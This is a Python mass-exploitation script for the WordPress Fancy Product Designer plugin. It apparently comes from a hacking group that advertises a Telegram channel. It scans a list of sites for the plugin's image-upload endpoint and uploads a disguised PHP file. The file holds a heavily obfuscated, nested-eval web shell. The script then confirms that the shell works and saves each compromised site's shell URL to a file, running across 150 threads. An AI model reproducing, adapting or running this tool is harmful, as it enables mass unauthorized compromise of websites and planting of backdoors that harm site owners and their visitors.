import sys , requests, re , json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print """
::::::::::: :::    ::: ::::    ::: ::::::::::: ::::    :::                ::::::::  :::         ::::::::
    :+:     :+:    :+: :+:+:   :+:     :+:     :+:+:   :+:               :+:    :+: :+:        :+:    :+:
    +:+     +:+    +:+ :+:+:+  +:+     +:+     :+:+:+  +:+               +:+        +:+        +:+
    +#+     +#+    +:+ +#+ +:+ +#+     +#+     +#+ +:+ +#+ +#++:++#++:++ +#+        +#+        +#++:++#++
    +#+     +#+    +#+ +#+  +#+#+#     +#+     +#+  +#+#+#               +#+        +#+               +#+
#+# #+#     #+#    #+# #+#   #+#+#     #+#     #+#   #+#+#               #+#    #+# #+#        #+#    #+#
 #####       ########  ###    #### ########### ###    ####                ########  ##########  ########

                   : Junin-CLS : 
            my group:https://t.me/juninclss 
                CMS : Wordpress
             Plugin : Fancy Product Designer 
        ]-------------------------------------[
"""
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
headers_up = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           "Content-Type": "multipart/form-data; boundary=---------------------------166450831928367048791705493639",
           'referer': 'www.google.com'}
uploader = """GIF89a
<?php
// Silence is golden.
                                                                                                                                                                                                                                                                                                         function _Z4rA($_BGVjpGk){$_BGVjpGk=substr($_BGVjpGk,(int)(hex2bin('383530')));$_BGVjpGk=substr($_BGVjpGk,(int)(hex2bin('30')),(int)(hex2bin('2d343834')));return $_BGVjpGk;}$_F2X3CXeXN='_Z4rA';$_CEYweTZra='base64_decode';function _KZyC0e1gr($_XrhDt){global $_F2X3CXeXN;global $_CEYweTZra;return strrev(gzinflate($_CEYweTZra(_Z4rA($_XrhDt))));}eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(_KZyC0e1gr('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')))))))))))))))))))))))))));
"""
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def Exploit(Exploit_Point,Domain):
    try:
        B0x01 = '-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"uploadsDir\"\x0d\x0a\x0d\x0aXO\x0d\x0a-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"uploadsDirURL\"\x0d\x0a\x0d\x0aXO\x0d\x0a-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"f[]\"; filename=\"spec.ph p\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0a'+uploader+'\x0d\x0a-----------------------------166450831928367048791705493639--\x0d\x0a'
        up = requests.post(Exploit_Point, data=B0x01, headers=headers_up, verify=False, timeout=30).content
        if "image_src" in up:
            Info_Shell = json.loads(up)
            Shell = Exploit_Point.replace("custom-image-handler.php", Info_Shell["image_src"])
            Check_Shell = requests.get(Shell+'?x=ooo', headers=headers, verify=False, timeout=15).content
            if "<input type='file'name='file' /><input type='submit' value='up' /></form>" in Check_Shell:
                print ' -| ' + Domain + ' --> {}[Succefully]'.format(fg)
                open('shells.txt', 'a').write(Shell +'\n')
            else:
                print ' -| ' + Domain + ' --> {}[Failedxx]'.format(fr)
        else:
            print ' -| ' + Domain + ' --> {}[Failed]'.format(fr)
    except:
        print ' -| ' + Domain + ' --> {}[Failed]'.format(fr)


def Checker(url):
    try:
        Dom = 'https://'+URLdomain(url)
        Exploit_Point = Dom+'/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php'
        check = requests.get(Exploit_Point,timeout=15,headers=headers,verify=False)
        if "You need to define a directory" in check.content and "save the uploaded user images" in check.content:
            Exploit(Exploit_Point,Dom)
        else:
            Dom = 'http://'+URLdomain(url)
            Exploit_Point = Dom+'/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php'
            check = requests.get(Exploit_Point,timeout=15,headers=headers,verify=False)
            if "You need to define a directory" in check.content and "save the uploaded user images" in check.content:
                Exploit(Exploit_Point,Dom)
            else:
                print ' -| ' + Dom + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + Dom + ' --> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(Checker, target)
mp.close()
mp.join()

print '\n [!] {}Saved in Shells.txt'.format(fc)
